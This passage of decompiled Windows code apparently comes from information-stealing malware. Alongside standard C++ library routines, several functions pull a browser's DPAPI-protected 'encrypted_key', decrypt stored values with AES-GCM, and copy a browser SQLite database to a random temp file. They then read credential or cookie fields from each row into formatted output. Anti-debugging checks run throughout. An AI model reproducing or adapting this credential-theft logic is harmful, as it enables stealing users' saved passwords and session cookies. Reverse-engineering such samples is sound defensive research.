    ppcVar3 = (code **)(~-(uint)(iVar2 != 0) & uVar1);
    if (ppcVar3 != (code **)0x0) {
      (**(code **)*ppcVar3)(1);
    }
  }
  return;
}



undefined FUN_003994d0(void)

{
  return 1;
}



undefined4 FUN_003994e0(void)

{
  return 1;
}



void FUN_003994f0(void)

{
  _Ctypevec *p_Var1;
  undefined **unaff_ESI;
  _Ctypevec local_14;
  
  unaff_ESI[1] = (undefined *)0x0;
  *unaff_ESI = (undefined *)std::ctype<char>::vftable;
  p_Var1 = __Getctype(&local_14);
  unaff_ESI[2] = (undefined *)p_Var1->_Page;
  unaff_ESI[3] = (undefined *)p_Var1->_Table;
  unaff_ESI[4] = (undefined *)p_Var1->_Delfl;
  unaff_ESI[5] = (undefined *)p_Var1->_LocaleName;
  return;
}



undefined4 __cdecl FUN_00399530(int *param_1)

{
  int iVar1;
  int **in_FS_OFFSET;
  bool bVar2;
  int local_38 [9];
  int local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c2f6b;
  local_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_10;
  local_14 = 0;
  if ((param_1 != (int *)0x0) && (*param_1 == 0)) {
    local_14 = FUN_003b103e(0x18);
    local_8 = 0;
    bVar2 = local_14 == 0;
    if (bVar2) {
      iVar1 = 0;
    }
    else {
      FUN_00399290((_Lockit *)local_38);
      iVar1 = FUN_003994f0();
    }
    local_8 = 0xffffffff;
    *param_1 = iVar1;
    if (!bVar2) {
      FUN_00399330(local_38);
    }
  }
  *in_FS_OFFSET = local_10;
  return 2;
}



void __thiscall FUN_003995e0(void *this,byte param_1)

{
  __Tolower((uint)param_1,(_Ctypevec *)((int)this + 8));
  return;
}



byte * __thiscall FUN_00399600(void *this,byte *param_1,byte *param_2)

{
  int iVar1;
  
  if (param_1 != param_2) {
    do {
      iVar1 = __Tolower((uint)*param_1,(_Ctypevec *)((int)this + 8));
      *param_1 = (byte)iVar1;
      param_1 = param_1 + 1;
    } while (param_1 != param_2);
  }
  return param_1;
}



void __thiscall FUN_00399630(void *this,byte param_1)

{
  __Toupper((uint)param_1,(_Ctypevec *)((int)this + 8));
  return;
}



byte * __thiscall FUN_00399650(void *this,byte *param_1,byte *param_2)

{
  int iVar1;
  
  if (param_1 != param_2) {
    do {
      iVar1 = __Toupper((uint)*param_1,(_Ctypevec *)((int)this + 8));
      *param_1 = (byte)iVar1;
      param_1 = param_1 + 1;
    } while (param_1 != param_2);
  }
  return param_1;
}



undefined FUN_00399680(undefined param_1)

{
  return param_1;
}



int FUN_00399690(undefined4 *param_1,int param_2,undefined4 *param_3)

{
  FUN_003aee70(param_3,param_1,param_2 - (int)param_1);
  return param_2;
}



undefined FUN_003996c0(undefined param_1)

{
  return param_1;
}



int FUN_003996d0(undefined4 *param_1,int param_2,undefined4 param_3,undefined4 *param_4)

{
  FUN_003aee70(param_4,param_1,param_2 - (int)param_1);
  return param_2;
}



undefined ** __thiscall FUN_00399700(void *this,byte param_1)

{
  *(undefined ***)this = std::ctype<char>::vftable;
  if (*(int *)((int)this + 0x14) < 1) {
    if (*(int *)((int)this + 0x14) < 0) {
      FUN_003b14b9(*(void **)((int)this + 0x10));
    }
  }
  else {
    _free(*(void **)((int)this + 0x10));
  }
  *(undefined ***)this = std::locale::facet::vftable;
  if ((param_1 & 1) != 0) {
    FUN_003aee4b(this);
  }
  return (undefined **)this;
}



undefined ** __thiscall FUN_00399750(void *this,byte param_1)

{
  FUN_003b0a88((undefined **)this);
  if ((param_1 & 1) != 0) {
    FUN_003aee4b(this);
  }
  return (undefined **)this;
}



void __thiscall FUN_00399780(void *this,char *param_1)

{
  uint uVar1;
  undefined **local_18 [3];
  undefined4 local_c;
  undefined **local_8;
  
  if ((char)param_1 != '\0') {
                    // WARNING: Subroutine does not return
    __CxxThrowException_8(0,(byte *)0x0);
  }
  uVar1 = *(uint *)((int)this + 0x10) & *(uint *)((int)this + 0xc);
  if ((uVar1 & 4) != 0) {
    local_8 = _GOST_KEY_TRANSPORT_it();
    param_1 = "ios_base::badbit set";
    std::exception::exception((exception *)local_18,&param_1);
    local_c = 1;
    local_18[0] = std::ios_base::failure::vftable;
                    // WARNING: Subroutine does not return
    __CxxThrowException_8(local_18,&DAT_003d31d4);
  }
  if ((uVar1 & 2) != 0) {
    local_8 = _GOST_KEY_TRANSPORT_it();
    param_1 = "ios_base::failbit set";
    std::exception::exception((exception *)local_18,&param_1);
    local_c = 1;
    local_18[0] = std::ios_base::failure::vftable;
                    // WARNING: Subroutine does not return
    __CxxThrowException_8(local_18,&DAT_003d31d4);
  }
  local_8 = _GOST_KEY_TRANSPORT_it();
  param_1 = "ios_base::eofbit set";
  std::exception::exception((exception *)local_18,&param_1);
  local_c = 1;
  local_18[0] = std::ios_base::failure::vftable;
                    // WARNING: Subroutine does not return
  __CxxThrowException_8(local_18,&DAT_003d31d4);
}



void FUN_00399850(void)

{
  int iVar1;
  int in_EAX;
  int *unaff_EDI;
  int local_8;
  
  iVar1 = **(int **)(in_EAX + 0x30);
  *unaff_EDI = iVar1;
  std::_Lockit::_Lockit((_Lockit *)&local_8,0);
  if (*(int *)(iVar1 + 4) != -1) {
    *(int *)(iVar1 + 4) = *(int *)(iVar1 + 4) + 1;
  }
  FUN_003ae995(&local_8);
  return;
}



void FUN_00399890(void)

{
  _Locimp **pp_Var1;
  _Locimp *p_Var2;
  int unaff_ESI;
  int local_c;
  int local_8;
  
  *(undefined4 *)(unaff_ESI + 0x30) = 0;
  *(undefined4 *)(unaff_ESI + 8) = 0;
  *(undefined4 *)(unaff_ESI + 0x10) = 0;
  *(undefined4 *)(unaff_ESI + 0x14) = 0x201;
  *(undefined4 *)(unaff_ESI + 0x18) = 6;
  *(undefined4 *)(unaff_ESI + 0x1c) = 0;
  *(undefined4 *)(unaff_ESI + 0x20) = 0;
  *(undefined4 *)(unaff_ESI + 0x24) = 0;
  *(undefined4 *)(unaff_ESI + 0x28) = 0;
  *(undefined4 *)(unaff_ESI + 0x2c) = 0;
  *(undefined4 *)(unaff_ESI + 0xc) = 0;
  pp_Var1 = (_Locimp **)FUN_003b103e(4);
  if (pp_Var1 != (_Locimp **)0x0) {
    p_Var2 = std::locale::_Init();
    *pp_Var1 = p_Var2;
    local_8 = _ENGINE_get_table_flags();
    std::_Lockit::_Lockit((_Lockit *)&local_c,0);
    if (*(int *)(local_8 + 4) != -1) {
      *(int *)(local_8 + 4) = *(int *)(local_8 + 4) + 1;
    }
    FUN_003ae995(&local_c);
    *(_Locimp ***)(unaff_ESI + 0x30) = pp_Var1;
    return;
  }
  *(undefined4 *)(unaff_ESI + 0x30) = 0;
  return;
}



undefined ** __thiscall FUN_00399920(void *this,exception *param_1)

{
  std::exception::exception((exception *)this,param_1);
  *(undefined ***)this = std::system_error::vftable;
  *(undefined4 *)((int)this + 0xc) = *(undefined4 *)(param_1 + 0xc);
  *(undefined4 *)((int)this + 0x10) = *(undefined4 *)(param_1 + 0x10);
  *(undefined ***)this = std::ios_base::failure::vftable;
  return (undefined **)this;
}



undefined ** __thiscall FUN_00399950(void *this,exception *param_1)

{
  std::exception::exception((exception *)this,param_1);
  *(undefined ***)this = std::system_error::vftable;
  *(undefined4 *)((int)this + 0xc) = *(undefined4 *)(param_1 + 0xc);
  *(undefined4 *)((int)this + 0x10) = *(undefined4 *)(param_1 + 0x10);
  return (undefined **)this;
}



undefined ** __thiscall FUN_00399980(void *this,byte param_1)

{
  *(undefined ***)this = std::ios_base::vftable;
  std::ios_base::_Ios_base_dtor((ios_base *)this);
  if ((param_1 & 1) != 0) {
    FUN_003aee4b(this);
  }
  return (undefined **)this;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_003999d0(undefined4 param_1)

{
  undefined4 uVar1;
  int iVar2;
  int iVar3;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 uVar4;
  undefined8 uVar5;
  undefined uVar6;
  undefined uVar7;
  undefined local_1fc4 [4];
  undefined4 *local_1fc0;
  undefined4 local_1fbc;
  undefined local_1fb8 [4];
  undefined4 *local_1fb4;
  uint local_1fb0;
  undefined4 local_1fac;
  undefined4 local_1fa8 [2024];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  local_1fac = 0x1fa0;
  trim_string((undefined (*) [16])local_1fa8,0,0x1fa0);
  uVar4 = param_1;
  uVar1 = (*_DAT_003d9418)(param_1,1,local_1fa8,&local_1fac,0,0);
  uVar7 = (undefined)uVar4;
  uVar5 = (*_DAT_003d94e0)(param_1,uVar1);
  uVar4 = (undefined4)((ulonglong)uVar5 >> 0x20);
  uVar6 = (undefined)param_1;
  if ((int)uVar5 != 0) {
    iVar2 = (*_DAT_003d92fc)();
    if (iVar2 != 0) {
      iVar3 = (*_DAT_003d9340)(iVar2,1,0);
      if (iVar3 == 0) {
        local_1fc0 = local_1fa8;
        local_1fbc = local_1fac;
        local_1fb4 = (undefined4 *)0x0;
        local_1fb0 = 0;
        iVar3 = (*_DAT_003d931c)(local_1fc4,local_1fb8,0);
        if (iVar3 == 0) {
          FUN_003aee70(local_1fa8,local_1fb4,local_1fb0);
          *(undefined *)((int)local_1fa8 + local_1fb0) = 0;
          (*_DAT_003d9324)(iVar2);
          terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,extraout_EDX,uVar7);
          return;
        }
      }
      (*_DAT_003d9520)(&DAT_003ce656,&DAT_003ce656);
      (*_DAT_003d9324)(iVar2);
      terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,extraout_EDX_00,uVar6);
      return;
    }
    (*_DAT_003d9520)(&DAT_003ce656,&DAT_003ce656);
    uVar4 = extraout_EDX_01;
  }
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,uVar4,uVar7);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

byte __cdecl FUN_00399b50(int *param_1)

{
  byte bVar1;
  int iVar2;
  int iVar3;
  int *unaff_EBX;
  byte bVar4;
  int local_18;
  int local_14;
  int local_c [2];
  
  bVar4 = 0;
  bVar1 = 0;
  iVar2 = (*_DAT_003d93b4)();
  if ((iVar2 != 0) && (iVar2 != -1)) {
    iVar3 = (*_DAT_003d936c)(iVar2,&local_18);
    bVar1 = bVar4;
    if ((iVar3 != 0) && (local_14 == 0)) {
      *unaff_EBX = local_18;
      iVar3 = (*_DAT_003d94c8)(0x40,local_18);
      *param_1 = iVar3;
      if (iVar3 != 0) {
        bVar1 = (*_DAT_003d94dc)(iVar2,iVar3,*unaff_EBX,local_c,0);
        bVar1 = bVar1 & *unaff_EBX == local_c[0];
        if (bVar1 == 0) {
          (*_DAT_003d95c8)(*param_1);
        }
      }
    }
    (*_DAT_003d93b8)(iVar2);
  }
  return bVar1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

int FUN_00399be0(void)

{
  undefined4 *in_EAX;
  int iVar1;
  int *unaff_EDI;
  
  *unaff_EDI = 0;
  *in_EAX = 0;
  iVar1 = (*_DAT_003d94e0)();
  if (iVar1 != 0) {
    iVar1 = (*_DAT_003d94c8)(0x40,*in_EAX);
    *unaff_EDI = iVar1;
    if (iVar1 != 0) {
      iVar1 = (*_DAT_003d94e0)();
      if (iVar1 != 0) {
        return iVar1;
      }
      iVar1 = (*_DAT_003d95c8)(*unaff_EDI);
      *unaff_EDI = iVar1;
      return 0;
    }
  }
  return 0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

uint __cdecl FUN_00399c40(undefined4 *param_1)

{
  int iVar1;
  undefined4 *puVar2;
  uint uVar3;
  uint *unaff_EDI;
  undefined local_18 [8];
  uint local_10;
  undefined4 *local_c;
  
  iVar1 = (*_DAT_003d9428)(local_18,0,0,0,0,0,&local_10);
  if (iVar1 != 0) {
    *unaff_EDI = local_10;
    puVar2 = (undefined4 *)(*_DAT_003d94c8)(0x40,local_10);
    *param_1 = puVar2;
    if (puVar2 != (undefined4 *)0x0) {
      FUN_003aee70(puVar2,local_c,*unaff_EDI);
    }
  }
  uVar3 = (*_DAT_003d95c8)(local_c);
  return uVar3 & 0xffffff00 | (uint)(iVar1 != 0);
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_00399cb0(undefined4 param_1)

{
  int iVar1;
  int *unaff_ESI;
  int *unaff_EDI;
  
  *unaff_ESI = 0;
  *unaff_EDI = 0;
  iVar1 = (*_DAT_003d9410)();
  if (-1 < iVar1) {
    iVar1 = (*_DAT_003d93e8)(*unaff_ESI,L"ChainingMode",L"ChainingModeGCM",0x20,0);
    if (-1 < iVar1) {
      iVar1 = (*_DAT_003d93c4)(*unaff_ESI);
      if (-1 < iVar1) {
        return 1;
      }
    }
    if (*unaff_ESI != 0) {
      (*_DAT_003d9464)(*unaff_ESI,0);
      *unaff_ESI = 0;
    }
    if (*unaff_EDI != 0) {
      (*_DAT_003d9518)(*unaff_EDI);
      *unaff_EDI = 0;
    }
    *unaff_ESI = 0;
    *unaff_EDI = 0;
  }
  return 0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00399d30(undefined4 param_1)

{
  byte bVar1;
  uint uVar2;
  undefined3 extraout_var;
  undefined *puVar3;
  int *piVar4;
  size_t sVar5;
  int iVar6;
  undefined *puVar7;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 extraout_EDX_03;
  undefined4 uVar8;
  undefined4 extraout_EDX_04;
  void *pvVar9;
  int **_Str;
  int **in_FS_OFFSET;
  undefined8 uVar10;
  undefined extraout_var_00;
  undefined uVar11;
  uint local_40;
  int local_3c;
  undefined4 local_38;
  void *local_34;
  void *local_30 [4];
  undefined4 local_20;
  uint local_1c;
  uint local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c2f38;
  local_10 = *in_FS_OFFSET;
  uVar2 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  local_38 = 0;
  local_14 = uVar2;
  bVar1 = FUN_00399b50(&local_3c);
  pvVar9 = local_34;
  iVar6 = local_3c;
  uVar8 = extraout_EDX;
  uVar11 = extraout_var_00;
  if (((CONCAT31(extraout_var,bVar1) != 0) && (local_3c != 0)) && (local_34 != (void *)0x0)) {
    uVar10 = (*_DAT_003d94c8)(0x40,(int)local_34 + 1,uVar2);
    uVar8 = (undefined4)((ulonglong)uVar10 >> 0x20);
    puVar3 = (undefined *)uVar10;
    if (puVar3 != (undefined *)0x0) {
      if (pvVar9 != (void *)0x0) {
        puVar7 = puVar3;
        do {
          *puVar7 = puVar7[iVar6 - (int)puVar3];
          puVar7 = puVar7 + 1;
          pvVar9 = (void *)((int)pvVar9 + -1);
        } while (pvVar9 != (void *)0x0);
      }
      uVar10 = (*_DAT_003d93a0)(puVar3,"encrypted_key");
      uVar8 = (undefined4)((ulonglong)uVar10 >> 0x20);
      if ((int)uVar10 != 0) {
        _Str = (int **)((int)uVar10 + 0x10);
        local_1c = 0xf;
        local_20 = 0;
        local_30[0] = (void *)((uint)local_30[0] & 0xffffff00);
        piVar4 = (int *)_strlen((char *)_Str);
        FUN_003894c0(local_30,_Str,piVar4);
        local_8 = 0;
        sVar5 = _strlen("\"}");
        piVar4 = (int *)FUN_003959f0(local_30,"\"}",sVar5);
        if (piVar4 != (int *)0xffffffff) {
          FUN_003898c0(local_30,piVar4,0xffffffff);
        }
        iVar6 = FUN_00399be0();
        uVar8 = extraout_EDX_00;
        if (((iVar6 != 0) && (4 < local_40)) &&
           ((iVar6 = _memcmp(local_34,"DPAPI",5), uVar8 = extraout_EDX_01, iVar6 == 0 &&
            ((uVar2 = FUN_00399c40(&local_3c), uVar8 = extraout_EDX_02, (char)uVar2 != '\0' &&
             (local_34 == (void *)0x20)))))) {
          local_38 = 1;
          FUN_00399cb0(local_3c);
          uVar8 = extraout_EDX_03;
        }
        if (0xf < local_1c) {
          FUN_003aee4b(local_30[0]);
          uVar8 = extraout_EDX_04;
        }
      }
    }
  }
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_14 ^ (uint)&stack0xfffffffc,uVar8,uVar11);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 * FUN_00399ee0(void)

{
  size_t in_EAX;
  undefined4 *puVar1;
  int iVar2;
  undefined4 *extraout_var;
  size_t sVar3;
  uint local_14;
  undefined4 *local_10;
  undefined local_c [8];
  
  sVar3 = in_EAX;
  puVar1 = (undefined4 *)_malloc(in_EAX);
  FUN_003aee70(puVar1,extraout_var,sVar3);
  puVar1 = (undefined4 *)_malloc(in_EAX);
  iVar2 = (*_DAT_003d9428)(local_c,0,0,0,0,0,&local_14);
  if (iVar2 != 0) {
    if (local_14 != 0) {
      FUN_003aee70(puVar1,local_10,local_14);
    }
    *(undefined *)(local_14 + (int)puVar1) = 0;
    return puVar1;
  }
  return (undefined4 *)0x0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_00399f60(void *param_1,uint param_2,int param_3,int param_4)

{
  uint uVar1;
  int iVar2;
  int **ppiVar3;
  int *piVar4;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 uVar5;
  undefined *unaff_EBX;
  int **in_FS_OFFSET;
  undefined in_stack_ffffff80;
  undefined4 local_7c;
  undefined4 local_78;
  int local_74;
  int local_70;
  int local_64;
  undefined4 local_60;
  int local_38;
  int local_34;
  void *local_30 [7];
  uint local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c2f08;
  local_10 = *in_FS_OFFSET;
  uVar1 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  local_38 = param_4;
  local_34 = 0;
  local_14 = uVar1;
  if (param_2 < 3) {
LAB_0039a09e:
    ppiVar3 = (int **)FUN_00399ee0();
    *(undefined4 *)(unaff_EBX + 0x14) = 0xf;
    *(undefined4 *)(unaff_EBX + 0x10) = 0;
    *unaff_EBX = 0;
    piVar4 = (int *)_strlen((char *)ppiVar3);
  }
  else {
    iVar2 = _memcmp(param_1,&DAT_003ce99c,3);
    if (iVar2 != 0) goto LAB_0039a09e;
    if ((param_3 != 0) && (local_38 != 0)) {
      trim_string((undefined (*) [16])&local_7c,0,0x40);
      local_74 = (int)param_1 + 3;
      local_64 = (param_2 - 0x13) + local_74;
      local_34 = param_2 - 0x1f;
      local_7c = 0x40;
      local_78 = 1;
      local_70 = 0xc;
      local_60 = 0x10;
      ppiVar3 = (int **)(*_DAT_003d94c8)(0x40,local_34,uVar1);
      if (ppiVar3 != (int **)0x0) {
        iVar2 = (*_DAT_003d9568)(local_38,local_70 + local_74,local_34,&local_7c,0,0,ppiVar3,
                                 local_34,&local_34,0);
        if (-1 < iVar2) {
          FUN_003a1790(ppiVar3);
          local_8 = 0;
          FUN_00389340();
          FUN_00389360(local_30);
          uVar5 = extraout_EDX;
          goto LAB_0039a0cc;
        }
      }
      FUN_00389300(unaff_EBX,(int **)&DAT_003d0aa0);
      uVar5 = extraout_EDX_00;
      goto LAB_0039a0cc;
    }
    *(undefined4 *)(unaff_EBX + 0x14) = 0xf;
    *(undefined4 *)(unaff_EBX + 0x10) = 0;
    *unaff_EBX = 0;
    piVar4 = (int *)_strlen("NULL");
    ppiVar3 = (int **)&DAT_003d0aa0;
  }
  FUN_003894c0(unaff_EBX,ppiVar3,piVar4);
  uVar5 = extraout_EDX_01;
LAB_0039a0cc:
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_14 ^ (uint)&stack0xfffffffc,uVar5,in_stack_ffffff80);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0039a0f0(undefined4 param_1,int param_2,int param_3)

{
  uint uVar1;
  undefined *puVar2;
  ulong uVar3;
  undefined4 uVar4;
  void *pvVar5;
  undefined4 ****ppppuVar6;
  undefined4 extraout_EDX;
  int iVar7;
  int **in_FS_OFFSET;
  int iVar8;
  undefined uVar9;
  undefined4 uVar10;
  undefined4 local_144;
  undefined4 local_140;
  undefined4 local_13c;
  undefined4 ****local_138 [4];
  undefined4 local_128;
  uint local_124;
  undefined local_11c [264];
  uint local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c325b;
  local_10 = *in_FS_OFFSET;
  uVar1 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  local_14 = uVar1;
  trim_string((undefined (*) [16])local_11c,0,0x104);
  (*_DAT_003d9520)(local_11c,DAT_003d9098,uVar1);
  puVar2 = (undefined *)_malloc(0x1a);
  *puVar2 = 0;
  uVar3 = (*_DAT_003d958c)();
  FUN_003b27b4(uVar3);
  iVar7 = 0x1a;
  do {
    uVar1 = FUN_003b27c6();
    (*_DAT_003d9374)(puVar2,&DAT_003d1ad4,puVar2,(int)uVar1 % 10);
    iVar7 = iVar7 + -1;
  } while (iVar7 != 0);
  puVar2[0x1a] = 0;
  (*_DAT_003d9520)(local_11c,puVar2);
  uVar10 = 1;
  (*_DAT_003d93c8)(local_140,local_11c);
  uVar4 = DAT_003d8e98;
  iVar7 = (*_DAT_003d9344)(local_11c,&local_144);
  uVar9 = (undefined)uVar10;
  if (iVar7 == 0) {
    iVar7 = (*_DAT_003d92f8)(local_144,uVar4,0xffffffff,&local_13c,0);
    uVar9 = (undefined)uVar10;
    if (iVar7 == 0) {
      iVar7 = (*_DAT_003d9314)(local_13c);
      while (uVar9 = (undefined)uVar10, iVar7 == 100) {
        local_140 = (*_DAT_003d9334)(local_13c,0);
        uVar4 = (*_DAT_003d9334)(local_13c,1);
        iVar7 = param_2;
        iVar8 = param_3;
        uVar1 = (*_DAT_003d9320)(local_13c,2);
        pvVar5 = (void *)(*_DAT_003d9328)(local_13c,2);
        FUN_00399f60(pvVar5,uVar1,iVar7,iVar8);
        local_8 = 0;
        ppppuVar6 = local_138[0];
        if (local_124 < 0x10) {
          ppppuVar6 = local_138;
        }
        iVar7 = (*_DAT_003d9550)(ppppuVar6,&DAT_003ce656);
        if (iVar7 == 0) {
          iVar7 = (*_DAT_003d9550)(uVar4,&DAT_003ce656);
          if (iVar7 != 0) {
            (*_DAT_003d9520)();
            (*_DAT_003d9520)();
            (*_DAT_003d9520)();
            (*_DAT_003d9520)();
            (*_DAT_003d9520)();
            (*_DAT_003d9520)();
            (*_DAT_003d9520)();
            (*_DAT_003d9520)();
            (*_DAT_003d9520)();
            (*_DAT_003d9520)();
            (*_DAT_003d9520)();
            (*_DAT_003d9520)();
            goto LAB_0039a425;
          }
        }
        else {
          (*_DAT_003d9520)();
          (*_DAT_003d9520)();
          (*_DAT_003d9520)();
          (*_DAT_003d9520)();
          (*_DAT_003d9520)();
          (*_DAT_003d9520)();
          (*_DAT_003d9520)();
          (*_DAT_003d9520)();
          (*_DAT_003d9520)();
          (*_DAT_003d9520)();
          (*_DAT_003d9520)();
          (*_DAT_003d9520)();
LAB_0039a425:
          (*_DAT_003d9520)();
          (*_DAT_003d9520)();
          (*_DAT_003d9520)();
        }
        local_8 = 0xffffffff;
        if (0xf < local_124) {
          FUN_003aee4b(local_138[0]);
        }
        local_124 = 0xf;
        local_128 = 0;
        local_138[0] = (undefined4 ****)((uint)local_138[0] & 0xffffff00);
        iVar7 = (*_DAT_003d9314)(local_13c);
      }
    }
    (*_DAT_003d9318)(local_13c);
    (*_DAT_003d9348)(local_144);
  }
  (*_DAT_003d9424)(local_11c);
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_14 ^ (uint)&stack0xfffffffc,extraout_EDX,uVar9);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall
FUN_0039a4f0(int param_1,int param_2,undefined4 param_3,undefined1 *param_4,undefined4 param_5,
            int *param_6)

{
  int iVar1;
  undefined *puVar2;
  ulong uVar3;
  uint uVar4;
  undefined4 uVar5;
  undefined (*lorem_ipsum) [16];
  undefined (*lorem_ipsum_00) [16];
  undefined (*lorem_ipsum_01) [16];
  undefined4 uVar6;
  void *pvVar7;
  undefined4 *puVar8;
  undefined4 extraout_EDX;
  undefined4 unaff_ESI;
  int **in_FS_OFFSET;
  undefined8 uVar9;
  int iVar10;
  undefined4 uVar11;
  undefined uVar12;
  undefined4 local_250;
  undefined4 local_24c;
  undefined4 local_248;
  int local_244;
  void *local_240;
  undefined4 local_230;
  uint local_22c;
  undefined local_224 [264];
  undefined local_11c [264];
  uint local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c42cb;
  local_10 = *in_FS_OFFSET;
  local_14 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  local_24c = param_3;
  iVar1 = (*_DAT_003d9550)(param_5,DAT_003d8e0c,local_14);
  if (iVar1 == 0) {
    param_4 = &DAT_003ce656;
  }
  else {
    iVar1 = (*_DAT_003d9550)(param_5,DAT_003d8e34);
    if (iVar1 == 0) {
      param_4 = &DAT_003ce656;
    }
    else {
      uVar9 = (*_DAT_003d9550)(param_4,DAT_003d9110);
      uVar5 = (undefined4)((ulonglong)uVar9 >> 0x20);
      uVar12 = (undefined)unaff_ESI;
      if ((int)uVar9 == 0) goto LAB_0039aa64;
    }
  }
  trim_string((undefined (*) [16])local_224,0,0x104);
  (*_DAT_003d9520)(local_224,DAT_003d9098);
  puVar2 = (undefined *)_malloc(0x1a);
  *puVar2 = 0;
  uVar3 = (*_DAT_003d958c)();
  FUN_003b27b4(uVar3);
  local_244 = 0x1a;
  do {
    uVar4 = FUN_003b27c6();
    (*_DAT_003d9374)(puVar2,&DAT_003d1ad4,puVar2,(int)uVar4 % 10);
    local_244 = local_244 + -1;
  } while (local_244 != 0);
  puVar2[0x1a] = 0;
  (*_DAT_003d9520)(local_224,puVar2);
  (*_DAT_003d93c8)(local_24c,local_224,1);
  trim_string((undefined (*) [16])local_11c,0,0x104);
  (*_DAT_003d9520)(local_11c,&DAT_003ce7fc);
  (*_DAT_003d9520)(local_11c,DAT_003d9104);
  (*_DAT_003d9520)(local_11c,&DAT_003ce7fc);
  (*_DAT_003d9520)(local_11c,param_5);
  (*_DAT_003d9520)(local_11c,&DAT_003d103c);
  (*_DAT_003d9520)(local_11c,param_4);
  (*_DAT_003d9520)(local_11c,&DAT_003ce80c);
  uVar5 = DAT_003d8d94;
  iVar1 = (*_DAT_003d9344)(local_224,&local_250);
  uVar12 = (undefined)unaff_ESI;
  if (iVar1 == 0) {
    iVar1 = (*_DAT_003d92f8)(local_250,uVar5,0xffffffff,&local_248,0);
    uVar12 = (undefined)unaff_ESI;
    if (iVar1 == 0) {
      uVar5 = (*_DAT_003d957c)(0,999999);
      local_244 = (*_DAT_003d9504)(uVar5);
      iVar1 = (*_DAT_003d9314)(local_248);
      uVar12 = (undefined)unaff_ESI;
      while (iVar1 == 100) {
        local_24c = (*_DAT_003d9334)(local_248,0);
        lorem_ipsum = (undefined (*) [16])(*_DAT_003d9334)(local_248,1);
        uVar5 = (*_DAT_003d9334)(local_248,2);
        lorem_ipsum_00 = (undefined (*) [16])(*_DAT_003d9334)(local_248,3);
        lorem_ipsum_01 = (undefined (*) [16])(*_DAT_003d9334)(local_248,4);
        uVar6 = (*_DAT_003d9334)(local_248,5);
        iVar1 = (*_DAT_003d9550)(lorem_ipsum,&DAT_003d1040);
        if (iVar1 == 0) {
          trim_string(lorem_ipsum,0,4);
          uVar11 = DAT_003d8dec;
        }
        else {
          trim_string(lorem_ipsum,0,4);
          uVar11 = DAT_003d920c;
        }
        (*_DAT_003d9520)(lorem_ipsum,uVar11);
        iVar1 = (*_DAT_003d9550)(lorem_ipsum_00,&DAT_003d1040);
        if (iVar1 == 0) {
          trim_string(lorem_ipsum_00,0,4);
          uVar11 = DAT_003d8dec;
        }
        else {
          trim_string(lorem_ipsum_00,0,4);
          uVar11 = DAT_003d920c;
        }
        (*_DAT_003d9520)(lorem_ipsum_00,uVar11);
        if ((*lorem_ipsum_01)[0] == '-') {
          trim_string(lorem_ipsum_01,0,4);
          (*_DAT_003d9520)(lorem_ipsum_01,&DAT_003d1040);
        }
        (*_DAT_003d9520)(local_244,local_24c);
        (*_DAT_003d9520)(local_244,&DAT_003d1044);
        (*_DAT_003d9520)(local_244,lorem_ipsum);
        (*_DAT_003d9520)(local_244,&DAT_003d1044);
        (*_DAT_003d9520)(local_244,uVar5);
        (*_DAT_003d9520)(local_244,&DAT_003d1044);
        (*_DAT_003d9520)(local_244,lorem_ipsum_00);
        (*_DAT_003d9520)(local_244,&DAT_003d1044);
        (*_DAT_003d9520)(local_244,lorem_ipsum_01);
        (*_DAT_003d9520)(local_244,&DAT_003d1044);
        (*_DAT_003d9520)(local_244,uVar6);
        (*_DAT_003d9520)(local_244,&DAT_003d1044);
        iVar1 = param_1;
        iVar10 = param_2;
        uVar4 = (*_DAT_003d9320)(local_248,6);
        pvVar7 = (void *)(*_DAT_003d9328)(local_248,6);
        puVar8 = (undefined4 *)FUN_00399f60(pvVar7,uVar4,iVar1,iVar10);
        local_8 = 0;
        if (0xf < (uint)puVar8[5]) {
          puVar8 = (undefined4 *)*puVar8;
        }
        (*_DAT_003d9520)(local_244,puVar8);
        local_8 = 0xffffffff;
        if (0xf < local_22c) {
